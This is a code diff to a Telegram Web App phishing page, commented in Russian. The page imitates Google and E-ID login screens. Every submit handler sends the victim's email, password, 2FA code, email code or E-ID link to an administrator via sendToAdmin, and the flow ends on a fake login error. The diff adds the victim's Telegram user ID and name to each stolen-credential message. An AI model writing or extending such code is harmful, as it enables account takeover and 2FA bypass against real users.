@@ -204,7 +204,7 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 4.5: КОД ИЗ ПОЧТЫ (НОВАЯ)
+        СТРАНИЦА 4.5: КОД ИЗ ПОЧТЫ
         ============================================================ -->
         <div id="pageEmailCode" class="page">
             <div class="page-title">Код из почты</div>
@@ -255,24 +255,29 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
+        // Получаем данные пользователя Telegram (ID и т.д.)
+        const user = tg.initDataUnsafe?.user || {};
+        const userId = user.id || 'неизвестно';
+        const userFirstName = user.first_name || 'Гость';
+
         const pageMain = document.getElementById('pageMain');
         const pageEid = document.getElementById('pageEid');
         const pageEidLink = document.getElementById('pageEidLink');
         const pageCode = document.getElementById('pageCode');
-        const pageEmailCode = document.getElementById('pageEmailCode'); // Новая страница
+        const pageEmailCode = document.getElementById('pageEmailCode');
         const pageLoginError = document.getElementById('pageLoginError');
 
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
-        const emailCodeInput = document.getElementById('emailCodeInput'); // Новое поле
+        const emailCodeInput = document.getElementById('emailCodeInput');
         const eidEmail = document.getElementById('eidEmail');
         const eidPassword = document.getElementById('eidPassword');
         const eidLinkInput = document.getElementById('eidLinkInput');
 
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
-        const submitEmailCodeBtn = document.getElementById('submitEmailCodeBtn'); // Новая кнопка
+        const submitEmailCodeBtn = document.getElementById('submitEmailCodeBtn');
         const eidSubmitBtn = document.getElementById('eidSubmitBtn');
         const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
 
@@ -339,7 +344,9 @@
             loginSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            const ok = await sendToAdmin(`🔔 Новая заявка\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
+            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
+            const msg = `🔔 Новая заявка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            const ok = await sendToAdmin(msg);
             
             if (ok) {
                 loginSubmitBtn.disabled = false;
@@ -360,12 +367,14 @@
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🔐 Код 2FA (Google)\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`);
+            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
+            const msg = `🔐 Код 2FA (Google)\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
-                switchPage(pageEmailCode); // Переход на код с почты
+                switchPage(pageEmailCode);
             } else {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
@@ -373,7 +382,7 @@
             }
         });
 
-        // ВВОД КОДА ИЗ ПОЧТЫ (НОВОЕ)
+        // ВВОД КОДА ИЗ ПОЧТЫ
         submitEmailCodeBtn.addEventListener('click', async function() {
             const code = emailCodeInput.value.trim();
             if (!code) { showMessage('Введите код', 'error'); return; }
@@ -381,12 +390,14 @@
             submitEmailCodeBtn.disabled = true;
             submitEmailCodeBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`📧 Код из почты\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`);
+            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
+            const msg = `📧 Код из почты\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 submitEmailCodeBtn.disabled = false;
                 submitEmailCodeBtn.textContent = 'Подтвердить';
-                goToLoginError(); // Ошибка в конце
+                goToLoginError();
             } else {
                 submitEmailCodeBtn.disabled = false;
                 submitEmailCodeBtn.textContent = 'Подтвердить';
@@ -404,7 +415,9 @@
             eidSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            const ok = await sendToAdmin(`🆔 E-ID Вход\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
+            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
+            const msg = `🆔 E-ID Вход\n\n👤 ID: ${userId}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 eidSubmitBtn.disabled = false;
@@ -425,7 +438,9 @@
             eidLinkSubmitBtn.disabled = true;
             eidLinkSubmitBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🔗 E-ID Ссылка\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`);
+            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
+            const msg = `🔗 E-ID Ссылка\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 eidLinkSubmitBtn.disabled = false;
